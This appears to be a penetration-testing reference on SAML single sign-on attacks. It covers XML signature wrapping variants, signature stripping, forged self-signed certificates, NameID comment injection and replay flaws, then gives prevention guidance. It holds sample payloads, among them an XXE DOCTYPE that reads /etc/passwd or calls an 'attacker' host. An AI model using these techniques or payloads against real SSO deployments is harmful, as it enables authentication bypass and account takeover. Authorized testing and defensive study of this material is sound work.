# SAML / SSO Attacks — Deep Reference

Authorized testing only. Forge or alter assertions **only** for identities and
accounts you are explicitly authorized to test. SAML bugs are full-auth-bypass
class — keep PoCs minimal and SAFE; log proof to `./_EXPLOIT/`.

---

## 1. SAML flow & trust model

SAML SSO is a triangle:

- **SP (Service Provider)** — the app you're attacking. It consumes assertions.
- **IdP (Identity Provider)** — Okta / ADFS / Auth0 / OneLogin / Keycloak /
  PingFederate / Shibboleth. It authenticates the user and issues a signed
  assertion.
- **User-agent** — the browser, which relays messages between SP and IdP
  (SP-initiated, the common case).

Web Browser SSO, SP-initiated:
1. User hits the SP. SP builds a `<samlp:AuthnRequest>` (a `SAMLRequest`) and
   redirects the browser to the IdP. Redirect-binding `SAMLRequest` values are
   **DEFLATE-compressed then base64-encoded then URL-encoded** — inflate to read.
2. User authenticates at the IdP.
3. IdP returns a `<samlp:Response>` containing one or more `<saml:Assertion>`
   elements, **base64-encoded** in a hidden `SAMLResponse` form field, auto-
   POSTed by the browser to the SP's **Assertion Consumer Service (ACS)** URL
   (`/saml/acs`, `/saml/consume`, `/Shibboleth.sso/SAML2/POST`, etc.). POST-
   binding is base64 only (no deflate).
4. SP validates signature + conditions, then trusts the assertion's
   `<saml:Subject><saml:NameID>` as the authenticated identity and reads
   `<saml:AttributeStatement>` for roles/email/groups.

### The assertion (what you tamper)
Key elements:
- `<saml:Issuer>` — who issued it (must match the configured IdP).
- `<ds:Signature>` — XML-DSig. Crucial: **what does the `Reference URI="#ID"`
  cover** — the whole Response, the Assertion, or nothing useful?
- `<saml:Subject><saml:NameID>` — the identity the SP logs you in as. **Primary
  tamper target.**
- `<saml:SubjectConfirmationData Recipient= NotOnOrAfter= InResponseTo=>`
- `<saml:Conditions NotBefore= NotOnOrAfter=><saml:AudienceRestriction>`
- `<saml:AuthnStatement>` and `<saml:AttributeStatement>` (roles → privilege).

### XML Signature (XML-DSig) essentials
A `<ds:Signature>` contains `<ds:SignedInfo>` (which lists `<ds:Reference
URI="#ID">` + `<ds:DigestValue>` for each signed element), `<ds:SignatureValue>`
(RSA/ECDSA over SignedInfo's canonical form), and `<ds:KeyInfo>` (often the
signer's `<ds:X509Certificate>`). **Root cause of nearly every SAML break:**
signature validation and assertion consumption are two separate passes that can
disagree about *which element* is authoritative.

---

## 2. Working with SAML in Burp (SAML Raider)

- **SAML Raider** (Burp extension) is the workhorse. It auto-detects
  `SAMLRequest`/`SAMLResponse` params, base64/inflate-decodes them, and shows an
  editable XML tree in the message editor.
- Built-in one-click attacks: all **XSW1-8** templates, **Remove Signatures**,
  **(Re)Sign Assertion / Message** using a self-signed cert it generates and
  manages in its certificate store, and **send certificate** import/export.
- Workflow: intercept the ACS POST → SAML Raider tab → edit NameID/attributes
  or apply an XSW template → forward → observe whether the SP issues a session.
- **EsPReSSO / SSO Scanner** — discover SSO flows and binding types.
- For redirect binding, decode manually: URL-decode → base64-decode → raw
  inflate (zlib, `-15` window / `flate`). Re-encode in reverse to send.

---

## 3. XML Signature Wrapping (XSW1-8) in depth

XSW keeps a **legitimately signed** element in the document so the signature
still verifies, while injecting an **attacker-controlled** copy that the SP's
business logic actually reads. Exploits the validator/consumer split: validator
finds the signed element by ID/Reference, consumer reads "the first Assertion"
or an XPath like `//saml:Assertion` that resolves to the forged one.

Two signature scopes → two families:
- **Response signature** (the `<samlp:Response>` is signed): XSW1, XSW2.
- **Assertion signature** (the `<saml:Assertion>` is signed): XSW3-XSW8.

Reference: Hackmanit / the original XSW research (Somorovsky et al.).

| Variant | Sig scope | Mechanic |
|---------|-----------|----------|
| **XSW1** | Response | Clone the signed Response as an **unsigned** copy placed **after** the original Signature; give the evil copy a new/empty ID. Consumer reads the unsigned forged Response. |
| **XSW2** | Response | Like XSW1 but the cloned unsigned Response is placed **before** the Signature (detached signature). |
| **XSW3** | Assertion | Insert a **forged unsigned Assertion as the first child** of Response, **before** the original signed Assertion. SP processes the first Assertion. |
| **XSW4** | Assertion | Like XSW3 but the forged Assertion **wraps/contains** the original signed Assertion. |
| **XSW5** | Assertion | Copy the **signature** of the original Assertion into the forged Assertion; original signed Assertion's value is altered (works where Assertion is at top level). |
| **XSW6** | Assertion | Forged Assertion placed inside the original Signature element; original signed Assertion moved into the forged one (nesting). |
| **XSW7** | Assertion | Add an `<Extensions>` element holding the forged Assertion with the same ID as the original — exploits XPath ID-collision (a same-ID with lower hierarchy). |
| **XSW8** | Assertion | Like XSW7 but uses a non-standard wrapper (`Object`) to host the **original** signed Assertion while the forged one is at the trusted position. |

Practical: try every variant via SAML Raider; the one that works reveals the
exact selector flaw. After a variant validates, set the forged Assertion's
NameID / role attributes to your target (e.g. `admin`).

Related parser-differential issues (PortSwigger "The Fragile Lock"):
- **Attribute pollution** — colliding attributes (`ID` vs `samlp:ID`) where the
  parser returns only one and doesn't guarantee which; validator and consumer
  pick different ones.
- **Namespace confusion** — some parsers (e.g. REXML) treat reserved `xml`/
  `xmlns` as ordinary attributes, letting you hide the real signature from one
  parser while keeping it for another.
- **Void canonicalization** — when a transform/Reference URI is unresolvable,
  many parsers silently canonicalize to an **empty string**; the digest then
  validates over nothing, so any assertion passes (CVE-2025-66567 /
  CVE-2025-66568 class in ruby-saml / xmlseclibs).

---

## 4. Signature stripping & exclusion

- **Stripping**: delete `<ds:Signature>` entirely. SPs that treat signature as
  optional ("if present, verify") accept any assertion → edit NameID freely.
  Also test when only the Response *or* only the Assertion is signed — strip the
  unsigned-checked one.
- **Exclusion**: keep a `<Signature>` element but empty/remove `SignedInfo` or
  `SignatureValue`, or point `Reference URI` at a missing ID. Buggy validators
  short-circuit to "no error" = valid.
- **Algorithm confusion / downgrade**: switch `SignatureMethod`/`DigestMethod`
  to SHA-1 or a weak/`none`-style algorithm if the SP doesn't pin a minimum
  (OWASP: require RSA-SHA-256+, reject SHA-1).

---

## 5. Certificate / key confusion & self-signed acceptance

The SP must trust **a pinned IdP certificate**, not whatever cert is embedded in
the message. If it trusts `<ds:KeyInfo><ds:X509Certificate>`:
1. Generate your own self-signed cert (SAML Raider does this).
2. Re-sign the tampered assertion with your private key.
3. Embed your cert in `<ds:KeyInfo>`.
The SP validates the signature against the attacker cert → accepts. This is a
common, devastating misconfiguration. Also test: cert with matching CN but
different key, expired IdP cert still accepted, and key-confusion between
signing and encryption certs.

---

## 6. NameID comment injection

Payload in the NameID: `admin@victim.com<!---->.attacker.com`.

The signature covers the entire byte string, so it still verifies. But XML APIs
that return only the **first text node** of an element (some DOM
`getTextContent`-style accessors split on the comment node) hand the SP just
`admin@victim.com`, while the IdP legitimately issued the full
attacker-controlled value. Net: log in as `admin@victim.com`. Famous in
duo-labs / Okta / OneLogin / GitHub-era libraries. Variations: use multiple
comments, or place the comment to truncate at a different boundary
(`victim.com<!--x-->evil` etc.).

---

## 7. XXE in assertion parsing

The SP parses attacker-supplied XML *before* (or while) validating it. If the
parser resolves DOCTYPE/external entities:
```
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
... &x; ...   (or SYSTEM "http://attacker/" for SSRF / OOB)
```
Read local files, SSRF to internal services / cloud metadata, or trigger
OOB/blind XXE via a parameter entity + external DTD. Hand off to
`/xxe-injection` for the full payload set. Even unsigned/rejected assertions can
trigger XXE if the parse happens first.

---

## 8. Recipient / Audience / InResponseTo / replay validation flaws

SPs frequently skip these checks (OWASP SAML cheat sheet mandates all):
- **Destination / Recipient** must exactly equal the SP's ACS URL. Missing or
  unchecked → an assertion minted for SP-A can be replayed to SP-B.
- **Audience** (`<AudienceRestriction>`) must equal the SP's EntityID. Unchecked
  → cross-SP assertion reuse / confused-deputy.
- **NotBefore / NotOnOrAfter** — expired assertion accepted → stolen-assertion
  replay window is unbounded.
- **InResponseTo** must match a pending `AuthnRequest` ID the SP issued.
  Missing → IdP-initiated/unsolicited assertions accepted (forgery surface).
- **One-time use / replay cache** — same assertion accepted twice → replay.
- **Issuer** must match the configured IdP, else any IdP (or attacker) issues.

Stolen-assertion + missing checks = account takeover without breaking crypto.

---

## 9. Notable CVEs

- **CVE-2024-45409** (ruby-saml / omniauth-saml, → GitLab) — CVSS 9.8/10.
  Signature verification used an over-broad XPath (`//ds:Reference` descendant
  axis) instead of a relative `./` path, letting an attacker who has **any**
  IdP-signed document smuggle a forged `DigestValue` (e.g. inside
  `samlp:Extensions`) so the wrong digest is validated → forge an assertion for
  any user including admin. Fixed in 1.17.0 (and 1.12.3 for the 12.x line).
  Synacktiv published a PoC.
- **CVE-2025-66567 / CVE-2025-66568** (ruby-saml / xmlseclibs, PortSwigger
  "The Fragile Lock") — parser-differential / void-canonicalization class:
  attribute pollution, namespace confusion, and empty-string canonicalization
  enabling signature reuse on arbitrary assertions.
- **simpleSAMLphp / xmlseclibs** XML signature validation bypass (Hackmanit) —
  classic XSW where the verifier and consumer disagreed on the signed node.
- **Duo / OneLogin / Clever / GitHub Enterprise** (2018, duo-labs) — the NameID
  XML **comment-injection** family across multiple major SAML libraries.
- General OpenSAML / WS-Security XSW lineage (Somorovsky et al., 2012) — origin
  of the XSW1-8 taxonomy.

---

## 10. Prevention (what a correct SP does — and what its absence is your bug)

- Verify the signature **and confirm the `Reference URI` covers the exact
  Assertion/Response element being trusted** (defeats XSW).
- Use a hardened, schema-validating parser; **disable DTDs/external entities**
  (defeats XXE); reject documents with a DOCTYPE.
- Pin the IdP's certificate out-of-band; **never** trust the embedded
  `<ds:KeyInfo>` cert. Reject self-signed/untrusted signers.
- Require strong algorithms (RSA-SHA-256+); reject SHA-1 and `none`.
- Reject unsigned, partially-signed, or empty-signature responses.
- Read the NameID as the full element text, immune to comment splitting; use the
  same parser/DOM for validation and consumption to kill differentials.
- Enforce `Destination`, `Recipient`, `Audience`, `Issuer`, `NotBefore`/
  `NotOnOrAfter`, `InResponseTo`, and a one-time-use replay cache.

---

## Sources
- https://portswigger.net/research/the-fragile-lock
- https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html
- https://web-in-security.blogspot.com/2019/07/testing-saml-endpoints-for-xml.html
- https://hackmanit.de/en/blog-en/82-xml-signature-validation-bypass-in-simplesamlphp-and-xmlseclibs/
- https://www.ibm.com/think/topics/xml-signature-wrapping
- https://projectdiscovery.io/blog/ruby-saml-gitlab-auth-bypass
- https://workos.com/blog/ruby-saml-cve-2024-45409
- https://github.com/synacktiv/CVE-2024-45409
- https://advisories.gitlab.com/pkg/gem/ruby-saml/CVE-2024-45409/
